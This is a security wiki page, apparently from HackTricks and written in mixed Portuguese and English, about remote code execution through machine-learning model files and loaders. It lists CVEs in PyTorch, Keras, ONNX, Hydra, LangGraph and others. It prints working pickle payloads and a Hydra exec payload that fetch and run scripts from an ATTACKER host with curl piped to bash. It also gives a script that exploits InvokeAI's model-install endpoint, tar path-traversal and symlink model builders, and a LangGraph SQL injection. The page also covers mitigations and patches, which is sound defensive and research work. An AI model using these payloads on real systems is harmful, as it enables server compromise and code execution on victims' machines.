# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Loading models to RCE

Modelos de Machine Learning geralmente são compartilhados em diferentes formatos, como ONNX, TensorFlow, PyTorch, etc. Esses modelos podem ser carregados em máquinas de desenvolvedores ou sistemas de produção para uso. Normalmente os modelos não deveriam conter código malicioso, mas há alguns casos em que o modelo pode ser usado para executar código arbitrário no sistema como um recurso intencional ou por causa de uma vulnerabilidade na biblioteca de carregamento do modelo.

No momento da escrita, estes são alguns exemplos desse tipo de vulnerabilidades:

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | Malicious pickle in model checkpoint leads to code execution (bypassing `weights_only` safeguard)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + malicious model download causes code execution; Java deserialization RCE in management API                                        | |
| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization via `torch.load` **(CVE-2025-23298)**                                           | Untrusted checkpoint triggers pickle reducer during `load_model_trainer_states_from_checkpoint` → code execution in ML worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + unsafe MessagePack extension hook **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | User-controlled `filter` key injects SQL/JSON-path syntax, `UNION SELECT` fabricates a fake checkpoint row, then `msgpack` deserialization imports and calls attacker-chosen Python code | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Loading model from YAML uses `yaml.unsafe_load` (code exec) <br> Loading model with **Lambda** layer runs arbitrary Python code          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Crafted `.tflite` model triggers integer overflow → heap corruption (potential RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Loading a model via `joblib.load` executes pickle with attacker’s `__reduce__` payload                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load` default allowed pickled object arrays – malicious `.npy/.npz` triggers code exec                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX model’s external-weights path can escape directory (read arbitrary files) <br> Malicious ONNX model tar can overwrite arbitrary files (leading to RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Model with custom operator requires loading attacker’s native code; complex model graphs abuse logic to execute unintended computations   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Using model-load API with `--model-control` enabled allows relative path traversal to write files (e.g., overwrite `.bashrc` for RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Malformed GGUF model file causes heap buffer overflows in parser, enabling arbitrary code execution on victim system                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Malicious HDF5 (`.h5`) model with Lambda layer code still executes on load (Keras safe_mode doesn’t cover old format – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Many ML tools (e.g., pickle-based model formats, Python `pickle.load`) will execute arbitrary code embedded in model files unless mitigated | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Untrusted metadata passed to `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Attacker-controlled model metadata/config sets `_target_` to arbitrary callable (e.g., `builtins.exec`) → executed during load, even with “safe” formats (`.safetensors`, `.nemo`, repo `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Além disso, existem alguns modelos python baseados em pickle, como os usados por [PyTorch](https://github.com/pytorch/pytorch/security), que podem ser usados para executar código arbitrário no sistema se não forem carregados com `weights_only=True`. Portanto, qualquer modelo baseado em pickle pode ser especialmente suscetível a esse tipo de ataque, mesmo que não esteja listado na tabela acima.

### Hydra metadata → RCE (works even with safetensors)

`hydra.utils.instantiate()` importa e chama qualquer `_target_` com dotted path em um objeto de configuração/metadata. Quando bibliotecas fornecem **metadata de modelo não confiável** para `instantiate()`, um atacante pode fornecer uma callable e argumentos que executam imediatamente durante o carregamento do modelo (sem necessidade de pickle).

Exemplo de payload (funciona em `.nemo` `model_config.yaml`, repo `config.json`, ou `__metadata__` dentro de `.safetensors`):
```yaml
_target_: builtins.exec
_args_:
- "import os; os.system('curl http://ATTACKER/x|bash')"
```
Pontos principais:
- Disparado antes da inicialização do modelo em `restore_from/from_pretrained` do NeMo, coders do HuggingFace no uni2TS e loaders do FlexTok.
- O block-list de strings do Hydra é contornável via caminhos alternativos de importação (por exemplo, `enum.bltns.eval`) ou nomes resolvidos pela aplicação (por exemplo, `nemo.core.classes.common.os.system` → `posix`).
- O FlexTok também faz parse de metadados em string com `ast.literal_eval`, permitindo DoS (explosão de CPU/memória) antes da chamada do Hydra.

### 🆕  RCE no InvokeAI via `torch.load` (CVE-2024-12029)

`InvokeAI` é uma interface web open-source popular para Stable-Diffusion. As versões **5.3.1 – 5.4.2** expõem o endpoint REST `/api/v2/models/install` que permite aos usuários baixar e carregar modelos a partir de URLs arbitrárias.

Internamente, o endpoint eventualmente chama:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Quando o arquivo fornecido é um **PyTorch checkpoint (`*.ckpt`)**, `torch.load` realiza uma **desserialização via pickle**. Como o conteúdo vem diretamente da URL controlada pelo usuário, um atacante pode incorporar um objeto malicioso com um método `__reduce__` personalizado dentro do checkpoint; o método é executado **durante a desserialização**, levando a **remote code execution (RCE)** no servidor InvokeAI.

A vulnerabilidade recebeu **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Exploitation walk-through

1. Create a malicious checkpoint:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Hospede `payload.ckpt` em um servidor HTTP que você controla (por exemplo, `http://ATTACKER/payload.ckpt`).
3. Acione o endpoint vulnerável (nenhuma autenticação é necessária):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Quando o InvokeAI baixa o arquivo, ele chama `torch.load()` → o gadget `os.system` é executado e o atacante ganha execução de código no contexto do processo do InvokeAI.

Exploit pronto: módulo **Metasploit** `exploit/linux/http/invokeai_rce_cve_2024_12029` automatiza todo o fluxo.

#### Conditions

•  InvokeAI 5.3.1-5.4.2 (scan flag padrão **false**)
•  `/api/v2/models/install` acessível pelo atacante
•  O processo tem permissões para executar comandos de shell

#### Mitigations

* Atualize para **InvokeAI ≥ 5.4.3** – o patch define `scan=True` por padrão e realiza varredura de malware antes da desserialização.
* Ao carregar checkpoints programaticamente, use `torch.load(file, weights_only=True)` ou o novo helper [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).
* Aplique allow-lists / signatures para fontes de modelos e execute o serviço com least-privilege.

> ⚠️ Lembre-se de que **qualquer** formato baseado em Python pickle (incluindo muitos arquivos `.pt`, `.pkl`, `.ckpt`, `.pth`) é inerentemente inseguro para desserializar de fontes não confiáveis.

---

Exemplo de mitigação ad hoc se você precisar manter versões antigas do InvokeAI rodando atrás de um reverse proxy:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE via unsafe `torch.load` (CVE-2025-23298)

O Transformers4Rec da NVIDIA (parte do Merlin) expunha um carregador de checkpoint inseguro que chamava diretamente `torch.load()` em paths fornecidos pelo usuário. Como `torch.load` depende do Python `pickle`, um checkpoint controlado pelo atacante pode executar código arbitrário via um reducer durante a desserialização.

Caminho vulnerável (antes da correção): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Por que isso leva a RCE: no pickle do Python, um objeto pode definir um reducer (`__reduce__`/`__setstate__`) que retorna uma callable e argumentos. A callable é executada durante o unpickling. Se tal objeto estiver presente em um checkpoint, ele é executado antes de qualquer peso ser usado.

Exemplo mínimo de checkpoint malicioso:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Vetores de entrega e raio de explosão:
- Checkpoints/models trojanizados compartilhados via repos, buckets ou artifact registries
- Pipelines automatizados de resume/deploy que carregam checkpoints automaticamente
- A execução acontece dentro de workers de training/inference, muitas vezes com privilégios elevados (por exemplo, root em containers)

Correção: O commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) substituiu o `torch.load()` direto por um deserializer restrito e allow-listed implementado em `transformers4rec/utils/serialization.py`. O novo loader valida types/fields e impede que callables arbitrários sejam invocados durante o load.

Orientação defensiva específica para checkpoints PyTorch:
- Não faça unpickle de dados não confiáveis. Prefira formatos não executáveis como [Safetensors](https://huggingface.co/docs/safetensors/index) ou ONNX quando possível.
- Se você precisar usar serialização PyTorch, garanta `weights_only=True` (suportado em versões mais novas do PyTorch) ou use um unpickler customizado allow-listed semelhante ao patch do Transformers4Rec.
- Imponha provenance/signatures do model e faça sandbox da deserialização (seccomp/AppArmor; usuário non-root; FS restrito e sem network egress).
- Monitore child processes inesperados de serviços de ML no momento do load do checkpoint; rastreie uso de `torch.load()`/`pickle`.

POC e referências de vulnerable/patch:
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Example – crafting a malicious PyTorch model

- Create the model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Carregue o model:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialização Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

O FaceDetection-DSFD da Tencent expõe um endpoint `resnet` que desserializa dados controlados pelo usuário. A ZDI confirmou que um atacante remoto pode coagir uma vítima a carregar uma página/arquivo malicioso, fazer com que ele envie um blob serializado forjado para esse endpoint e acionar a desserialização como `root`, levando à comprometimento total.

O fluxo do exploit espelha o abuso típico de pickle:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Qualquer gadget alcançável durante a deserialização (constructors, `__setstate__`, callbacks do framework, etc.) pode ser weaponized da mesma forma, independentemente de o transporte ter sido HTTP, WebSocket, ou um file dropped into a watched directory.



### LangGraph checkpointer SQLi → MessagePack RCE

Essa chain de ataque é interessante porque o attacker **não precisa fazer upload de um malicious model file**. Em vez disso, a aplicação expõe uma **AI-agent persistence API** (`get_state_history(..., filter=...)`) e a user input alcança o checkpointer query builder.

#### 1. Structural SQLi em metadata filters

Um padrão SQLite vulnerável parecia ser:
```python
for query_key, query_value in filter.items():
operator, param_value = _where_value(query_value)
predicates.append(
f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
)
```
O valor é vinculado depois, mas `query_key` é concatenado na **string do JSON path**, então um `'` dentro da key do dicionário quebra `'$.{query_key}'` e injeta SQL. A mesma lição se aplica a **JSON paths, identifiers, operators, `LIMIT`, e campos TTL**: placeholders só protegem values, não a sintaxe estrutural da query.

#### 2. `UNION SELECT` pode atingir downstream sinks, não apenas roubo de dados

A query retorna `type` e bytes serializados de `checkpoint`, que depois são consumidos como:
```python
self.serde.loads_typed((type, checkpoint))
```
Isso significa que uma SQLi na cláusula `WHERE` pode injetar uma **linha de resultado falsa**:
```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```
Se, mais tarde, o código fizer parse, desserializar, escrever ou executar qualquer coluna selecionada, mapeie essas colunas para seus sinks. Neste caso, a linha falsa transforma SQLi em **attacker-controlled deserialization**.

#### 3. Unsafe MessagePack extension hooks are equivalent to code gadgets

O path `msgpack` do LangGraph usava um custom extension hook que desempacotava uma tupla aninhada e executava:
```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```
Então, um objeto de extensão MessagePack que codifica algo equivalente a `("os", "system", "id > /tmp/pwned")` importa `os`, resolve `system` e executa o comando. Ao revisar frameworks de AI, inspecione **custom MessagePack/JSON/pickle revivers** em busca de dynamic imports, reflection ou arbitrary callable dispatch.

#### 4. Padrão prático de auditoria para agent frameworks

Revise qualquer input controlado pelo usuário que chegue a:
- state history / memory / replay / checkpoint listing APIs
- structured filter builders que geram SQL ou Redis query fragments
- custom deserializers (`pickle`, `msgpack`, `json` object hooks, YAML constructors)
- recovery paths que confiam em rows retornadas pela persistence layer

Essa cadeia específica afetou deploys self-hosted do LangGraph usando **SQLite** ou **Redis** checkpointers quando usuários não confiáveis conseguiam controlar `filter`. As versões corrigidas mencionadas na divulgação foram `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+`, e `langgraph-checkpoint 4.0.1+`.

## Models to Path Traversal

Como comentado em [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), a maioria dos formatos de models usados por diferentes frameworks de AI é baseada em archives, geralmente `.zip`. Portanto, pode ser possível abusar desses formatos para realizar ataques de path traversal, permitindo ler arbitrary files do sistema onde o model é carregado.

Por exemplo, com o following code você pode criar um model que irá criar um file no diretório `/tmp` quando carregado:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Ou, com o seguinte código você pode criar um model que criará um symlink para o diretório `/tmp` quando for carregado:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Deep-dive: desserialização de Keras .keras e gadget hunting

Para um guia focado sobre os internals de .keras, Lambda-layer RCE, o problema de import arbitrário em ≤ 3.8 e a descoberta de gadgets pós-fix dentro da allowlist, veja:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [Unit 42 – Remote Code Execution With Modern AI/ML Formats and Libraries](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [Hydra instantiate docs](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [Hydra block-list commit (warning about RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [Check Point Research – From SQLi to RCE: Exploiting LangGraph's Checkpointer](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)

{{#include ../banners/hacktricks-training.md}}
